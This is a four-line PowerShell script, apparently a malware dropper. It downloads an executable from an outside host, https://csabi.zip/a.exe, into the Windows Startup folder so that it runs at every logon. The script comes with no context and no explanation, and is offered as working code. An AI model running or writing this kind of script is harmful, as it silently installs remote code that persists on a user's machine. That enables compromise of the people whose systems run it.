$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://csabi.zip/a.exe"
$outputPath = Join-Path $startupFolder "a.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath